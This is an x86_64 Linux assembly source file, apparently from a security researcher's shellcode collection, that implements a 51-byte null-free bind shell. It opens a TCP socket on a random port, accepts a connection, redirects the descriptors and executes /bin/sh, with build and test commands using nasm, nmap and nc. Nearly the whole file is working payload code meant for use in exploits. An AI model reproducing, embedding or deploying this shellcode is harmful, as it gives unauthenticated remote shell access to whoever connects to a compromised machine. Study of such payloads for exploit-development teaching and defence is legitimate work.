; Tiny Shell Bind TCP Random Port - Assembly Language - Linux/x86_64
; Copyright (c) 2021, Geyslan G. Bem, Hacking bits
; All rights reserved.
;
;     http://hackingbits.github.io
;     geyslan@gmail.com
;
; Redistribution and use in source and binary forms, with or without
; modification, are permitted provided that the following conditions
; are met:
;
;     * Redistributions of source code must retain the above copyright
;     notice, this list of conditions and the following disclaimer.
;
;     * Redistributions in binary form must reproduce the above
;     copyright notice, this list of conditions and the following
;     disclaimer in the documentation and/or other materials provided
;     with the distribution.
;
;     * Neither the name of the Geyslan G. Bem nor the names of its
;     contributors may be used to endorse or promote products derived
;     from this software without specific prior written permission.

; THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS 
; "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT 
; LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
; FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
; COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
; INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
; BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
; CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
; LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
; ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
; POSSIBILITY OF SUCH DAMAGE.


;   tiny_shell_bind_tcp_random_port_x86_64
;
;   * 51 bytes
;   * null-free
;
;
;   # nasm -f elf64 tiny_shell_bind_tcp_random_port_x86_64.asm; \
;     ld -m elf_x86_64 tiny_shell_bind_tcp_random_port_x86_64.o -o \
;     tiny_shell_bind_tcp_random_port_x86_64
;
;   Testing
;   Fist terminal
;   # ./tiny_shell_bind_tcp_random_port_x86_64
;   Second terminal (Discover the port and connect)
;   # netstat -anp | grep shell 
;   # nmap -sS 127.0.0.1 -p- (It's necessary to use the TCP SYN scan option [-sS],
;			      avoiding nmap to connect to the port open by shellcode)
;   # nc 127.0.0.1 port


global _start

section .text

_start:

	; syscalls (/usr/include/asm/unistd_64.h)
	; socket numbers (/usr/include/linux/net.h)

	; Creating the socket file descriptor
	; int socket(int domain, int type, int protocol);
	; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)

	; socket arguments (bits/socket.h, netinet/in.h)

	; Avoiding garbage
	; These push and pop unset the sign bit in rax used for cdq
	push 41			; syscall 41 - socket
	pop rax

	; Zeroing rdx, search about cdq instruction for understanding
	cdq			; IPPROTO_IP = 0 (int) - rdx

	push 1			; SOCK_STREAM = 1 (int)
	pop rsi

	push 2			; AF_INET = 2 (int)
	pop rdi

				; syscall 41 (rax) - socket	
	syscall			; kernel interruption


	; Preparing to listen the incoming connection (passive socket)
	; int listen(int sockfd, int backlog);
	; listen(sockfd, 1);

	; listen arguments	; just let rsi (backlog) as 1 - man(2) listen
	
	xchg eax, edi		; put the file descriptor returned by socket() into rdi

	mov al, 50		; syscall 50 - listen
	syscall			; kernel interruption


	; Accepting the incoming connection
	; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
	; accept(sockfd, NULL, NULL)

	; accept arguments	; rdi already contains the sockfd, likewise rdx contains 0

	xchg eax, esi		; put listen() return (0) into rsi

	mov al, 43		; syscall 43 - accept
	syscall			; kernel interruption


	; Creating a interchangeably copy of the file descriptors
	; int dup2(int oldfd, int newfd);
	; dup2(clientfd, ...)

	xchg edi, eax		; put the clientfd returned from accept into rdi
	xchg esi, eax		; put the sockfd integer into rsi to use as the loop counter

dup_loop:
	dec esi			; decrement loop counter

	push 33			; syscall 33 - dup2
	pop rax
	syscall			; kernel interruption

	jnz dup_loop


	; Finally, using execve to substitute the actual process with /bin/sh
	; int execve(const char *filename, char *const argv[], char *const envp[]);
	; exevcve("//bin/sh", NULL, NULL)

	; execve string argument
					; *envp[] rdx is already NULL
					; *argv[] rsi is already NULL
	push rdx			; put NULL terminating string
	mov rdi, 0x68732f6e69622f2f	; "//bin/sh"
	push rdi			; push //bin/sh string
	push rsp			; push the stack pointer
	pop rdi				; pop it (string address) into rdi

	mov al, 59			; execve syscall
	syscall				; bingo

